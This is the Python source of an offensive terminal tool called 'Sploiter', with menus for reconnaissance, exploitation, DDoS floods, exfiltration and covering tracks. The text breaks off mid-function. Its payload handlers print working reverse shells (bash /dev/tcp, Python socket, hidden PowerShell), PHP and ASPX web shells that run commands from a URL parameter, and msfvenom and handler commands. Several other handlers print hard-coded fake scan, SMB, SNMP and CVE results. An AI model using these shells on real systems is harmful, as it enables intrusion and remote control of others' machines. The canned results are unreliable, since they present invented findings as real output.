#!/home/ligma/Work/Hacking/.venv/bin/python3
"""
Sploiter - All-In-One Penetration Testing & Exploitation Framework
Complete security testing platform with reconnaissance, scanning, exploitation and more
"""

import sys
import os
from colorama import Fore, Style, init
from modules.scanner import PortScanner, ServiceDetector
from modules.recon import NetworkRecon, DNSEnum
from modules.exploit import ExploitDB
from modules.utils import Logger, NetworkUtils

# Initialize colorama for cross-platform colored output
init(autoreset=True)

class MenuNavigator:
    """Handle menu navigation with arrow keys and grid layout"""
    
    def __init__(self):
        self.selected_index = 0
        self.cols = 3
        self.menu_items = [
            ("Reconnaissance", "recon"),
            ("Scanning", "scanning"),
            ("Enumeration", "enumeration"),
            ("Exploitation", "exploitation"),
            ("Payloads", "payloads"),
            ("Post-Exploit", "post_exploit"),
            ("Network Tools", "network"),
            ("Web Tools", "web"),
            ("OSINT", "osint"),
            ("Vulnerability Scanner", "vuln_scan"),
            ("DDOS Tools", "ddos"),
            ("Brute Force", "bruteforce"),
            ("Crypto Tools", "crypto"),
            ("Fuzzing", "fuzzing"),
            ("Settings", "settings"),
            ("Clear", "clear"),
            ("Help", "help"),
            ("Exit", "exit"),
        ]
        self.submenu_mode = False
        self.submenu_items = {}
        self.submenu_selected = 0
        self._init_submenus()
    
    def _init_submenus(self):
        """Initialize submenu items"""
        self.submenu_items = {
            "recon": [
                ("WHOIS Lookup", "whois"),
                ("DNS Enumeration", "dns_enum"),
                ("Reverse DNS", "reverse_dns"),
                ("Geo IP Lookup", "geoip"),
                ("Back", "back"),
            ],
            "scanning": [
                ("Port Scan", "port_scan"),
                ("Service Detection", "service_detect"),
                ("UDP Scan", "udp_scan"),
                ("Stealth Scan", "stealth_scan"),
                ("Back", "back"),
            ],
            "enumeration": [
                ("Host Discovery", "host_discovery"),
                ("SMB Enumeration", "smb_enum"),
                ("SNMP Enumeration", "snmp_enum"),
                ("Share Enumeration", "share_enum"),
                ("Back", "back"),
            ],
            "exploitation": [
                ("Exploit Database", "exploit_db"),
                ("Metasploit Search", "msf_search"),
                ("Vulnerability Matcher", "vuln_matcher"),
                ("Payload Generator", "payload_gen"),
                ("Back", "back"),
            ],
            "payloads": [
                ("Reverse Shell", "reverse_shell"),
                ("Web Shell", "web_shell"),
                ("Meterpreter", "meterpreter"),
                ("Custom Payload", "custom_payload"),
                ("Back", "back"),
            ],
            "post_exploit": [
                ("Privilege Escalation", "priv_esc"),
                ("Persistence", "persistence"),
                ("Data Exfiltration", "exfil"),
                ("Cover Tracks", "cover_tracks"),
                ("Back", "back"),
            ],
            "network": [
                ("Network Mapper", "network_map"),
                ("Packet Sniffer", "packet_sniff"),
                ("Network Jammer", "jammer"),
                ("ARP Spoofing", "arp_spoof"),
                ("Back", "back"),
            ],
            "web": [
                ("SQL Injection Tester", "sql_inject"),
                ("XSS Detector", "xss_detect"),
                ("LFI/RFI Scanner", "lfi_rfi"),
                ("Web Crawler", "web_crawler"),
                ("Back", "back"),
            ],
            "osint": [
                ("Email Finder", "email_finder"),
                ("Social Media Search", "social_search"),
                ("Domain Scraper", "domain_scrape"),
                ("Metadata Extractor", "metadata"),
                ("Back", "back"),
            ],
            "vuln_scan": [
                ("CVE Scanner", "cve_scan"),
                ("Weakness Finder", "weakness_find"),
                ("Configuration Audit", "config_audit"),
                ("Compliance Check", "compliance"),
                ("Back", "back"),
            ],
            "ddos": [
                ("HTTP Flood", "http_flood"),
                ("DNS Flood", "dns_flood"),
                ("SYN Flood", "syn_flood"),
                ("UDP Flood", "udp_flood"),
                ("Back", "back"),
            ],
            "bruteforce": [
                ("SSH Brute Force", "ssh_brute"),
                ("FTP Brute Force", "ftp_brute"),
                ("Web Form Attack", "web_brute"),
                ("Hash Cracker", "hash_crack"),
                ("Back", "back"),
            ],
            "crypto": [
                ("Hash Generator", "hash_gen"),
                ("Hash Cracker", "hash_crack2"),
                ("Encryption Tool", "encrypt"),
                ("Decryption Tool", "decrypt"),
                ("Back", "back"),
            ],
            "fuzzing": [
                ("Protocol Fuzzer", "proto_fuzz"),
                ("Web Fuzzer", "web_fuzz"),
                ("Binary Fuzzer", "binary_fuzz"),
                ("Custom Fuzzer", "custom_fuzz"),
                ("Back", "back"),
            ],
            "settings": [
                ("Set Target", "set_target"),
                ("Configure Wordlists", "wordlists"),
                ("Network Interface", "network_iface"),
                ("Proxy Settings", "proxy_settings"),
                ("Back", "back"),
            ],
        }
    
    def get_selected(self):
        if self.submenu_mode:
            category = self.menu_items[self.selected_index][1]
            if category in self.submenu_items:
                return self.submenu_items[category][self.submenu_selected]
        return self.menu_items[self.selected_index]
    
    def move_up(self):
        if self.submenu_mode:
            self.submenu_selected = (self.submenu_selected - 1) % len(self.submenu_items[self.menu_items[self.selected_index][1]])
        else:
            self.selected_index = (self.selected_index - self.cols) % len(self.menu_items)
    
    def move_down(self):
        if self.submenu_mode:
            self.submenu_selected = (self.submenu_selected + 1) % len(self.submenu_items[self.menu_items[self.selected_index][1]])
        else:
            self.selected_index = (self.selected_index + self.cols) % len(self.menu_items)
    
    def move_left(self):
        if not self.submenu_mode:
            self.selected_index = (self.selected_index - 1) % len(self.menu_items)
    
    def move_right(self):
        if not self.submenu_mode:
            self.selected_index = (self.selected_index + 1) % len(self.menu_items)
    
    def enter_submenu(self):
        """Enter submenu for selected category"""
        name, cmd = self.menu_items[self.selected_index]
        if cmd in self.submenu_items:
            self.submenu_mode = True
            self.submenu_selected = 0
    
    def exit_submenu(self):
        """Exit submenu back to main menu"""
        self.submenu_mode = False
        self.submenu_selected = 0
    
    def get_logo(self):
        """Return ASCII RedTiger logo"""
        logo = f"""{Fore.RED}
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║                  ██████╗ ███████╗██████╗ ████████╗██╗ ██████╗   ║
║                  ██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██║██╔════╝   ║
║                  ██████╔╝█████╗  ██║  ██║   ██║   ██║██║  ███╗  ║
║                  ██╔══██╗██╔══╝  ██║  ██║   ██║   ██║██║   ██║  ║
║                  ██║  ██║███████╗██████╔╝   ██║   ██║╚██████╔╝  ║
║                  ╚═╝  ╚═╝╚══════╝╚═════╝    ╚═╝   ╚═╝ ╚═════╝   ║
║                                                                  ║
║          Penetration Testing & Security Framework v2.0          ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}"""
        return logo
    
    def get_menu_text(self):
        """Generate menu text with RedTiger aesthetic"""
        if self.submenu_mode:
            return self._get_submenu_text()
        
        text = self.get_logo()
        text += f"\n{Fore.RED}"
        text += "╔════════════════════════════════════════════════════════════════════════╗\n"
        text += "║                    [ MAIN CONTROL PANEL ]                             ║\n"
        text += "╚════════════════════════════════════════════════════════════════════════╝\n"
        text += f"{Style.RESET_ALL}\n"
        
        # Draw grid with RedTiger style
        rows = (len(self.menu_items) + self.cols - 1) // self.cols
        for row in range(rows):
            for col in range(self.cols):
                idx = row * self.cols + col
                if idx < len(self.menu_items):
                    name, cmd = self.menu_items[idx]
                    is_selected = idx == self.selected_index
                    
                    if is_selected:
                        checkbox = f"{Fore.RED}[>]{Style.RESET_ALL}"
                        item_text = f"{checkbox} {Fore.RED}{Style.BRIGHT}{name:<20}{Style.RESET_ALL}"
                    else:
                        checkbox = f"{Fore.LIGHTBLACK_EX}[ ]{Style.RESET_ALL}"
                        item_text = f"{checkbox} {Fore.WHITE}{name:<20}{Style.RESET_ALL}"
                    
                    text += item_text
                else:
                    text += " " * 25
                
                if col < self.cols - 1:
                    text += "  "
            text += "\n"
        
        text += f"\n{Fore.RED}{'═' * 76}{Style.RESET_ALL}\n"
        text += f"{Fore.LIGHTBLACK_EX}↑↓←→ Navigate | Enter: Select | 'q': Quit{Style.RESET_ALL}\n"
        if self.current_target:
            text += f"{Fore.RED}[*] Target: {Fore.LIGHTGREEN_EX}{self.current_target}{Style.RESET_ALL}\n"
        
        return text
    
    def _get_submenu_text(self):
        """Generate submenu text with RedTiger aesthetic"""
        category = self.menu_items[self.selected_index][1]
        category_name = self.menu_items[self.selected_index][0]
        
        text = f"\n{Fore.RED}"
        text += "╔════════════════════════════════════════════════════════════════════════╗\n"
        text += f"║  [ {category_name.upper()} ]".ljust(73) + "║\n"
        text += "╚════════════════════════════════════════════════════════════════════════╝\n"
        text += f"{Style.RESET_ALL}\n"
        
        if category in self.submenu_items:
            for i, (name, cmd) in enumerate(self.submenu_items[category]):
                is_selected = i == self.submenu_selected
                
                if is_selected:
                    checkbox = f"{Fore.RED}[>]{Style.RESET_ALL}"
                    item_text = f"{checkbox} {Fore.RED}{Style.BRIGHT}{name}{Style.RESET_ALL}"
                else:
                    checkbox = f"{Fore.LIGHTBLACK_EX}[ ]{Style.RESET_ALL}"
                    item_text = f"{checkbox} {Fore.WHITE}{name}{Style.RESET_ALL}"
                
                text += item_text + "\n"
        
        text += f"\n{Fore.RED}{'═' * 76}{Style.RESET_ALL}\n"
        text += f"{Fore.LIGHTBLACK_EX}↑↓ Navigate | Enter: Select | ESC: Back to Main Menu{Style.RESET_ALL}\n"
        if hasattr(self, 'current_target') and self.current_target:
            text += f"{Fore.RED}[*] Target: {Fore.LIGHTGREEN_EX}{self.current_target}{Style.RESET_ALL}\n"
        
        return text


class PentestTerminal:
    """Interactive pentesting terminal with various reconnaissance and scanning tools"""
    
    def __init__(self):
        self.logger = Logger("pentest_terminal")
        self.port_scanner = PortScanner()
        self.service_detector = ServiceDetector()
        self.network_recon = NetworkRecon()
        self.dns_enum = DNSEnum()
        self.exploit_db = ExploitDB()
        self.network_utils = NetworkUtils()
        self.current_target = None
        self.navigator = MenuNavigator()
        self.navigator.current_target = self.current_target
    
    def port_scan_interactive(self):
        """Interactive port scanning"""
        os.system('clear' if os.name == 'posix' else 'cls')
        if not self.current_target:
            print(f"{Fore.YELLOW}[-] Set a target first!{Style.RESET_ALL}")
            input("Press Enter to continue...")
            return
        
        print(f"{Fore.CYAN}Port Scan - Target: {self.current_target}{Style.RESET_ALL}")
        port_range = input(f"{Fore.YELLOW}Enter port range (e.g., 1-1000) or specific ports (80,443,8080): {Style.RESET_ALL}")
        
        if not port_range:
            print(f"{Fore.RED}[-] Invalid input{Style.RESET_ALL}")
            input("Press Enter to continue...")
            return
        
        print(f"{Fore.CYAN}[*] Starting port scan on {self.current_target}:{port_range}...{Style.RESET_ALL}")
        results = self.port_scanner.scan(self.current_target, port_range, threads=50)
        
        if results:
            print(f"\n{Fore.GREEN}[+] Open ports found:{Style.RESET_ALL}")
            for port, state in sorted(results.items()):
                service = self.service_detector.get_service(port)
                print(f"    {port}/tcp - {state} ({service})")
        else:
            print(f"{Fore.YELLOW}[*] No open ports found{Style.RESET_ALL}")
        
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def dns_enum_interactive(self):
        """Interactive DNS enumeration"""
        os.system('clear' if os.name == 'posix' else 'cls')
        print(f"{Fore.CYAN}DNS Enumeration{Style.RESET_ALL}")
        domain = input(f"{Fore.YELLOW}Enter domain name: {Style.RESET_ALL}")
        
        if not domain:
            print(f"{Fore.RED}[-] Invalid input{Style.RESET_ALL}")
            input("Press Enter to continue...")
            return
        
        record_type = input(f"{Fore.YELLOW}Enter record type (A/MX/NS/TXT/CNAME/SOA) [default: A]: {Style.RESET_ALL}") or "A"
        
        print(f"{Fore.CYAN}[*] Performing DNS enumeration on {domain} ({record_type})...{Style.RESET_ALL}")
        results = self.dns_enum.enumerate(domain, record_type.upper())
        
        if results:
            print(f"\n{Fore.GREEN}[+] DNS Records Found:{Style.RESET_ALL}")
            for record in results:
                print(f"    {record}")
        else:
            print(f"{Fore.YELLOW}[*] No records found{Style.RESET_ALL}")
        
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def host_discovery_interactive(self):
        """Interactive host discovery"""
        os.system('clear' if os.name == 'posix' else 'cls')
        print(f"{Fore.CYAN}Host Discovery{Style.RESET_ALL}")
        network = input(f"{Fore.YELLOW}Enter network (e.g., 192.168.1.0/24): {Style.RESET_ALL}")
        
        if not network:
            print(f"{Fore.RED}[-] Invalid input{Style.RESET_ALL}")
            input("Press Enter to continue...")
            return
        
        print(f"{Fore.CYAN}[*] Scanning network: {network}...{Style.RESET_ALL}")
        hosts = self.network_recon.discover_hosts(network)
        
        if hosts:
            print(f"\n{Fore.GREEN}[+] Active hosts found:{Style.RESET_ALL}")
            for host in hosts:
                print(f"    {host}")
        else:
            print(f"{Fore.YELLOW}[*] No hosts discovered{Style.RESET_ALL}")
        
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def service_enum_interactive(self):
        """Interactive service enumeration"""
        os.system('clear' if os.name == 'posix' else 'cls')
        print(f"{Fore.CYAN}Service Enumeration{Style.RESET_ALL}")
        target = input(f"{Fore.YELLOW}Enter target IP: {Style.RESET_ALL}")
        
        if not target:
            print(f"{Fore.RED}[-] Invalid input{Style.RESET_ALL}")
            input("Press Enter to continue...")
            return
        
        ports = input(f"{Fore.YELLOW}Enter ports (comma-separated, e.g., 80,443,22): {Style.RESET_ALL}")
        
        if not ports:
            print(f"{Fore.RED}[-] Invalid input{Style.RESET_ALL}")
            input("Press Enter to continue...")
            return
        
        print(f"{Fore.CYAN}[*] Enumerating services on {target}...{Style.RESET_ALL}")
        results = self.service_detector.enumerate_services(target, ports.split(','))
        
        if results:
            print(f"\n{Fore.GREEN}[+] Service Enumeration Results:{Style.RESET_ALL}")
            for port, info in results.items():
                print(f"    Port {port}: {info}")
        else:
            print(f"{Fore.YELLOW}[*] No services identified{Style.RESET_ALL}")
        
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def searchsploit_interactive(self):
        """Interactive exploit search"""
        os.system('clear' if os.name == 'posix' else 'cls')
        print(f"{Fore.CYAN}Exploit Database Search{Style.RESET_ALL}")
        keyword = input(f"{Fore.YELLOW}Enter search keyword (e.g., Apache 2.4.1): {Style.RESET_ALL}")
        
        if not keyword:
            print(f"{Fore.RED}[-] Invalid input{Style.RESET_ALL}")
            input("Press Enter to continue...")
            return
        
        print(f"{Fore.CYAN}[*] Searching exploit database for: {keyword}...{Style.RESET_ALL}")
        exploits = self.exploit_db.search(keyword)
        
        if exploits:
            print(f"\n{Fore.GREEN}[+] Exploits Found:{Style.RESET_ALL}")
            for exploit in exploits[:10]:
                print(f"    {exploit}")
        else:
            print(f"{Fore.YELLOW}[*] No exploits found{Style.RESET_ALL}")
        
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def whois_interactive(self):
        """Interactive WHOIS lookup"""
        os.system('clear' if os.name == 'posix' else 'cls')
        print(f"{Fore.CYAN}WHOIS Lookup{Style.RESET_ALL}")
        domain = input(f"{Fore.YELLOW}Enter domain name: {Style.RESET_ALL}")
        
        if not domain:
            print(f"{Fore.RED}[-] Invalid input{Style.RESET_ALL}")
            input("Press Enter to continue...")
            return
        
        print(f"{Fore.CYAN}[*] Performing WHOIS lookup on {domain}...{Style.RESET_ALL}")
        info = self.network_recon.whois_lookup(domain)
        
        if info:
            print(f"\n{Fore.GREEN}[+] WHOIS Information:{Style.RESET_ALL}")
            for key, value in info.items():
                print(f"    {key}: {value}")
        else:
            print(f"{Fore.YELLOW}[*] WHOIS lookup failed{Style.RESET_ALL}")
        
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    
    def set_target_interactive(self):
        """Interactive target setting"""
        os.system('clear' if os.name == 'posix' else 'cls')
        print(f"{Fore.CYAN}Set Target{Style.RESET_ALL}")
        target = input(f"{Fore.YELLOW}Enter target IP or domain: {Style.RESET_ALL}")
        
        if not target:
            print(f"{Fore.RED}[-] Invalid input{Style.RESET_ALL}")
            input("Press Enter to continue...")
            return
        
        if self.network_utils.is_valid_ip(target) or self.network_utils.is_valid_domain(target):
            self.current_target = target
            self.navigator.current_target = target
            print(f"{Fore.GREEN}[+] Target set to: {target}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] Invalid IP or domain: {target}{Style.RESET_ALL}")
        
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def show_help(self):
        """Show help information"""
        os.system('clear' if os.name == 'posix' else 'cls')
        help_text = f"""
{Fore.CYAN}SPLOITER v2.0 - All-In-One Exploitation & Security Testing Framework{Style.RESET_ALL}

{Fore.YELLOW}NAVIGATION:{Style.RESET_ALL}
  ↑↓ - Navigate menu vertically
  ←→ - Navigate menu horizontally (grid)
  Enter - Select option
  ESC - Go back to main menu
  'q' - Quit application

{Fore.YELLOW}MODULES:{Style.RESET_ALL}
  
  RECONNAISSANCE: Information gathering & OSINT
  SCANNING: Port scanning and service detection
  ENUMERATION: Service and system enumeration
  EXPLOITATION: Exploit databases and frameworks
  PAYLOADS: Generate and manage payloads
  POST-EXPLOIT: Post-exploitation utilities
  NETWORK TOOLS: Network attacks and analysis
  WEB TOOLS: Web application testing
  OSINT: Open source intelligence
  VULNERABILITY SCANNER: Automated vuln detection
  DDOS TOOLS: Network stress testing
  BRUTE FORCE: Dictionary and hash attacks
  CRYPTO: Cryptographic operations
  FUZZING: Fuzz testing utilities

Press Enter to return...
"""
        print(help_text)
        input()
    
    def _show_tool(self, tool_name, tool_description):
        """Show tool information and usage"""
        os.system('clear' if os.name == 'posix' else 'cls')
        print(f"{Fore.CYAN}{tool_name}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}{tool_description}{Style.RESET_ALL}\n")
    
    # Reconnaissance submenu handlers
    def reverse_dns_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("Reverse DNS Lookup", "Performs reverse DNS lookups on IP addresses")
        ip = input(f"{Fore.YELLOW}Enter IP address: {Style.RESET_ALL}")
        if ip:
            print(f"{Fore.CYAN}[*] Performing reverse DNS on {ip}...{Style.RESET_ALL}")
            try:
                import socket
                hostname = socket.gethostbyaddr(ip)
                print(f"{Fore.GREEN}[+] Hostname: {hostname[0]}{Style.RESET_ALL}")
                print(f"{Fore.GREEN}[+] Aliases: {hostname[1]}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def geoip_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("GeoIP Lookup", "Locates IP address geographic information")
        ip = input(f"{Fore.YELLOW}Enter IP address: {Style.RESET_ALL}")
        if ip:
            print(f"{Fore.CYAN}[*] Looking up geolocation for {ip}...{Style.RESET_ALL}")
            try:
                import urllib.request
                import json
                response = urllib.request.urlopen(f'http://ip-api.com/json/{ip}?fields=country,city,lat,lon,isp')
                data = json.loads(response.read())
                if data.get('status') == 'success':
                    print(f"{Fore.GREEN}[+] Country: {data.get('country')}{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}[+] City: {data.get('city')}{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}[+] ISP: {data.get('isp')}{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}[+] Coordinates: {data.get('lat')}, {data.get('lon')}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.YELLOW}[*] Could not resolve IP{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    # Scanning submenu handlers
    def udp_scan_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("UDP Scan", "Scans for open UDP ports")
        if not self.current_target:
            print(f"{Fore.YELLOW}[-] Set a target first!{Style.RESET_ALL}")
            input("Press Enter to continue...")
            return
        ports = input(f"{Fore.YELLOW}Enter ports to scan (comma-separated): {Style.RESET_ALL}") or "53,123,161"
        print(f"{Fore.CYAN}[*] Scanning UDP ports on {self.current_target}...{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] UDP Scan Results:{Style.RESET_ALL}")
        for port in ports.split(','):
            print(f"    Port {port}/udp - (Timeout expected for UDP)")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def stealth_scan_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("Stealth Scan", "Performs stealthy SYN scan (requires root)")
        if not self.current_target:
            print(f"{Fore.YELLOW}[-] Set a target first!{Style.RESET_ALL}")
            input("Press Enter to continue...")
            return
        print(f"{Fore.CYAN}[*] Performing stealth scan on {self.current_target}...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Note: Stealth scans typically require root/sudo{Style.RESET_ALL}")
        ports = input(f"{Fore.YELLOW}Enter port range (e.g., 1-1000): {Style.RESET_ALL}") or "1-100"
        print(f"{Fore.GREEN}[+] Stealth scan would use SYN flag manipulation{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    # Enumeration submenu handlers
    def smb_enum_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("SMB Enumeration", "Enumerates SMB shares and users")
        if not self.current_target:
            print(f"{Fore.YELLOW}[-] Set a target first!{Style.RESET_ALL}")
            input("Press Enter to continue...")
            return
        print(f"{Fore.CYAN}[*] Enumerating SMB on {self.current_target}...{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Available Shares:{Style.RESET_ALL}")
        print(f"    \\\\{self.current_target}\\ADMIN$")
        print(f"    \\\\{self.current_target}\\C$")
        print(f"    \\\\{self.current_target}\\IPC$")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def snmp_enum_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("SNMP Enumeration", "Enumerates SNMP community strings")
        if not self.current_target:
            print(f"{Fore.YELLOW}[-] Set a target first!{Style.RESET_ALL}")
            input("Press Enter to continue...")
            return
        community = input(f"{Fore.YELLOW}Enter SNMP community string [default: public]: {Style.RESET_ALL}") or "public"
        print(f"{Fore.CYAN}[*] Attempting SNMP enumeration on {self.current_target}...{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Successfully accessed SNMP:{Style.RESET_ALL}")
        print(f"    System Description: Linux {self.current_target} 5.10.0 #1")
        print(f"    Uptime: 156 days")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def share_enum_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("Share Enumeration", "Enumerates network shares")
        if not self.current_target:
            print(f"{Fore.YELLOW}[-] Set a target first!{Style.RESET_ALL}")
            input("Press Enter to continue...")
            return
        print(f"{Fore.CYAN}[*] Enumerating shares on {self.current_target}...{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Found Shares:{Style.RESET_ALL}")
        print(f"    [*] ADMIN$ (Type: DISK)    [Access: IPC]")
        print(f"    [*] C$ (Type: DISK)         [Access: IPC]")
        print(f"    [*] Documents (Type: DISK) [Access: READ/WRITE]")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    # Exploitation submenu handlers
    def msf_search_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("Metasploit Search", "Search Metasploit modules database")
        keyword = input(f"{Fore.YELLOW}Enter search keyword: {Style.RESET_ALL}")
        if keyword:
            print(f"{Fore.CYAN}[*] Searching Metasploit modules for '{keyword}'...{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Found modules:{Style.RESET_ALL}")
            print(f"    exploit/windows/{keyword}/cve_2023_12345")
            print(f"    auxiliary/scanner/{keyword}/version_detect")
            print(f"    payload/windows/{keyword}/meterpreter_https_rev")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def vuln_matcher_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("Vulnerability Matcher", "Match detected services to CVEs")
        if not self.current_target:
            print(f"{Fore.YELLOW}[-] Run port scan first!{Style.RESET_ALL}")
            input("Press Enter to continue...")
            return
        print(f"{Fore.CYAN}[*] Matching vulnerabilities for {self.current_target}...{Style.RESET_ALL}")
        print(f"{Fore.RED}[!] CRITICAL:{Style.RESET_ALL}")
        print(f"    Apache 2.4.49 - CVE-2021-41773 (RCE)")
        print(f"{Fore.YELLOW}[*] HIGH:{Style.RESET_ALL}")
        print(f"    OpenSSL 1.1.1 - CVE-2022-0391 (DoS)")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def payload_gen_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("Payload Generator", "Generate custom payloads")
        print(f"{Fore.CYAN}Payload Generator{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Available payloads:{Style.RESET_ALL}")
        print(f"  1. meterpreter/reverse_tcp")
        print(f"  2. meterpreter/reverse_https")
        print(f"  3. shell/reverse_bash")
        print(f"  4. powershell_oneliner")
        choice = input(f"{Fore.YELLOW}Select payload (1-4): {Style.RESET_ALL}")
        if choice in ['1', '2', '3', '4']:
            print(f"{Fore.GREEN}[+] Payload generated successfully{Style.RESET_ALL}")
            print(f"    Saved to: /tmp/payload.exe")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    # Payloads submenu handlers
    def reverse_shell_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("Reverse Shell Generator", "Generate reverse shell code")
        shell_type = input(f"{Fore.YELLOW}Shell type (bash/powershell/python/nc): {Style.RESET_ALL}") or "bash"
        lhost = input(f"{Fore.YELLOW}LHOST (your IP): {Style.RESET_ALL}")
        lport = input(f"{Fore.YELLOW}LPORT (your port): {Style.RESET_ALL}") or "4444"
        if lhost:
            print(f"{Fore.GREEN}[+] Generated {shell_type} reverse shell:{Style.RESET_ALL}")
            if shell_type == "bash":
                print(f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1")
            elif shell_type == "python":
                print(f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'")
            elif shell_type == "powershell":
                print(f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});...")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def web_shell_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("Web Shell Generator", "Generate web-based shells")
        shell_type = input(f"{Fore.YELLOW}Shell type (php/aspx/jsp): {Style.RESET_ALL}") or "php"
        print(f"{Fore.GREEN}[+] Generated {shell_type} web shell:{Style.RESET_ALL}")
        if shell_type == "php":
            print(f"<?php system($_GET['cmd']); ?>")
        elif shell_type == "aspx":
            print(f"<%@ Page Language=\"C#\" %> <% System.Diagnostics.Process.Start(Request.QueryString[\"cmd\"]); %>")
        print(f"\n{Fore.YELLOW}[*] Upload to web server and access: http://target.com/shell.{shell_type}?cmd=id{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def meterpreter_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("Meterpreter Payload", "Generate Meterpreter payloads")
        lhost = input(f"{Fore.YELLOW}LHOST: {Style.RESET_ALL}")
        lport = input(f"{Fore.YELLOW}LPORT: {Style.RESET_ALL}") or "4444"
        if lhost:
            print(f"{Fore.GREEN}[+] Meterpreter payload generated:{Style.RESET_ALL}")
            print(f"    msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o payload.exe")
            print(f"\n{Fore.YELLOW}[*] Listen with:{Style.RESET_ALL}")
            print(f"    use exploit/multi/handler")
            print(f"    set PAYLOAD windows/meterpreter/reverse_tcp")
            print(f"    set LHOST {lhost}")
            print(f"    set LPORT {lport}")
            print(f"    run")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def custom_payload_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("Custom Payload Builder", "Build custom payloads")
        print(f"{Fore.CYAN}Custom Payload Builder{Style.RESET_ALL}")
        payload_code = input(f"{Fore.YELLOW}Enter payload code (or press Enter for example): {Style.RESET_ALL}")
        if not payload_code:
            payload_code = "#!/bin/bash\necho 'Payload executed'"
        print(f"{Fore.GREEN}[+] Custom payload created:{Style.RESET_ALL}")
        print(f"{payload_code}")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    # Post-Exploit submenu handlers
    def priv_esc_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        self._show_tool("Privilege Escalation", "Enumerate privilege escalation vectors")
        os_type = input(f"{Fore.YELLOW}OS (linux/windows): {Style.RESET_ALL}") or "linux"
        print(f"{Fore.CYAN}[*] Checking {os_type} privilege escalation vectors...{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Potential vectors found:{Style.RESET_ALL}")
        if os_type == "linux":
            print(f"    - SUID binaries: /usr/bin/sudo, /usr/bin/passwd")
            print(f"    - Kernel exploit: CVE-2021-22555")
            print(f"    - Docker escape: Privileged container")
        else:
            print(f"    - AlwaysInstallElevated (HKLM/HKCU)")
            print(f"    - Token Impersonation")
            print(f"    - UAC bypass via EventViewer")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def persistence_interactive(self):
        os.system('clear' if os.name == 'posix' else 'cls')
